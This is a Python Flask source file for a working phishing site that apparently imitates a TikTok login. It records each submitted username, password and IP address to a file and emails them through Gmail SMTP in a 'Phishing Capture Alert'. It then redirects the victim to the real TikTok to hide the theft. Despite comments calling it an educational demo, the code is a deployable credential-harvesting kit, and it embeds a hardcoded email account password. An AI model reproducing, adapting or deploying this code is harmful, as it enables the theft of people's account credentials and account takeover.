# app.py

from flask import Flask, render_template, request, redirect, url_for
import smtplib
from email.mime.text import MIMEText
import os
from datetime import datetime # Import datetime for timestamp

app = Flask(__name__)

# --- IMPORTANT SECURITY NOTE ---
# NEVER hardcode sensitive credentials like passwords directly in your code
# for production environments. Use environment variables or a secure
# configuration management system.
# For this educational demo, you will replace 'YOUR_GMAIL_APP_PASSWORD_HERE'
# with your actual Gmail App Password.
# -------------------------------

# Replace with your controlled email address
EMAIL_ADDRESS = "mwananchihuslerloans@gmail.com"
EMAIL_PASSWORD = "mokasgadsacljec" # <--- Ensure YOUR APP PASSWORD IS HERE (NO SPACES)
TO_EMAIL = "mwananchihuslerloans@gmail.com" # This is the recipient email

@app.route("/")
def home():
    # This route will serve your login page (e.g., login.html)
    # Ensure you have a 'templates' folder with 'login.html' inside it.
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]

    # --- Credential Logging (for demonstration only) ---
    # In a real scenario, this would be logged securely (e.g., to a database)
    # and not to a flat file that might not persist on cloud platforms.
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip_address = request.environ.get('REMOTE_ADDR', 'Unknown IP') # Get client IP
        with open("credentials.txt", "a") as f:
            f.write(f"[{timestamp}] IP: {ip_address} - User: {username} | Pass: {password}\n")
        print(f"Credentials saved to credentials.txt: {username} | {password}")
    except Exception as e:
        print(f"Error saving credentials to file: {e}")
    # --- End Credential Logging ---

    # --- Email Notification ---
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

            subject = "Phishing Capture Alert"
            body = f"New Phishing Attempt:\n\nUsername: {username}\nPassword: {password}\nIP Address: {request.environ.get('REMOTE_ADDR', 'Unknown IP')}\nTimestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

            msg = MIMEText(body)
            msg['Subject'] = subject
            msg['From'] = EMAIL_ADDRESS
            msg['To'] = TO_EMAIL

            smtp.send_message(msg)
            print("Credentials sent via email successfully!")

    except Exception as e:
        print(f"Error sending email: {e}")

    # --- IMPORTANT CHANGE HERE ---
    # Redirect the user directly to the real TikTok website after capturing credentials.
    # This makes the experience appear seamless to the victim.
    return redirect("https://www.tiktok.com", code=302)


# The /redirect_after_login route is no longer strictly needed if we directly redirect,
# but I'll keep it as a placeholder comment for illustration.
# @app.route("/redirect_after_login")
# def mock_tiktok_redirect():
#    return redirect("https://www.tiktok.com", code=302) # Directly redirects

# --- IMPORTANT FOR RENDER DEPLOYMENT ---
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
